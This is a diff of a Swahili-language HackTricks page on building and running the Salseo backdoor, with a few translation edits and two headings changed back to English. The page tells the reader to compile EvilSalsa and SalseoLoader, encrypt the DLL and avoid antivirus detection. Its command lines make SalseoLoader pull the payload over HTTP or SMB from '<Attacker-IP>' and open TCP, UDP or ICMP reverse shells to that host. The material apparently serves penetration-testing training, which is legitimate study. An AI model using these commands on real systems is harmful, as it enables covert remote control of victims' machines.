@@ -2,15 +2,15 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Kuunda binaries
+## Compiling the binaries
 
 Pakua msimbo wa chanzo kutoka github na uunde **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** iliyosakinishwa ili kuunda msimbo huo.
 
-Unda miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo unakusudia kuyatumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).
+Unda miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utatumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).
 
 Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **"Build" Tab** ya kushoto katika **"Platform Target".**
 
-(\*\*Ikiwa huwezi kupata chaguo hizi bonyeza kwenye **"Project Tab"** kisha kwenye **"\<Project Name> Properties"**)
+(**Ikiwa huwezi kupata chaguo hizi bonyeza kwenye **"Project Tab"** kisha kwenye **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -18,9 +18,9 @@ Kisha, jenga miradi yote miwili (Build -> Build Solution) (Ndani ya logi zitaone
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Andaa Backdoor
+## Prepare the Backdoor
 
-Kwanza kabisa, utahitaji kuandika **EvilSalsa.dll.** Ili kufanya hivyo, unaweza kutumia script ya python **encrypterassembly.py** au unaweza kuunda mradi **EncrypterAssembly**:
+Kwanza kabisa, utahitaji kuandika **EvilSalsa.dll.** Ili kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kuunda mradi **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -32,15 +32,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Sawa, sasa una kila kitu unachohitaji kutekeleza mambo yote ya Salseo: **encoded EvilDalsa.dll** na **binary ya SalseoLoader.**
+Sawa, sasa una kila kitu unachohitaji kutekeleza mambo yote ya Salseo: **EvilDalsa.dll iliyosimbwa** na **binary ya SalseoLoader.**
 
 **Pakia binary ya SalseoLoader.exe kwenye mashine. Hazipaswi kugundulika na AV yoyote...**
 
 ## **Tekeleza backdoor**
 
-### **Kupata TCP reverse shell (kupakua dll iliyosimbwa kupitia HTTP)**
+### **Kupata shell ya TCP reverse (kupakua dll iliyosimbwa kupitia HTTP)**
 
-Kumbuka kuanzisha nc kama msikilizaji wa reverse shell na seva ya HTTP kutoa evilsalsa iliyosimbwa.
+Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse na seva ya HTTP kutoa evilsalsa iliyosimbwa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -50,7 +50,7 @@ Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse, na seva ya SMB kutoa 
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kupata shell ya ICMP reverse (dll iliyokodishwa tayari ndani ya mwathirika)**
+### **Kupata shell ya ICMP reverse (dll iliyosimbwa tayari ndani ya mwathirika)**
 
 **Wakati huu unahitaji chombo maalum kwenye mteja kupokea shell ya reverse. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -83,7 +83,7 @@ Fungua mradi wa SalseoLoader ukitumia Visual Studio.
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Tafuta kifurushi cha DllExport (ukitumia kichupo cha Browse), na bonyeza Sakinisha (na kubali popup)**
+#### **Tafuta kifurushi cha DllExport (ukitumia tab ya Kagua), na bonyeza Sakinisha (na kubali popup)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
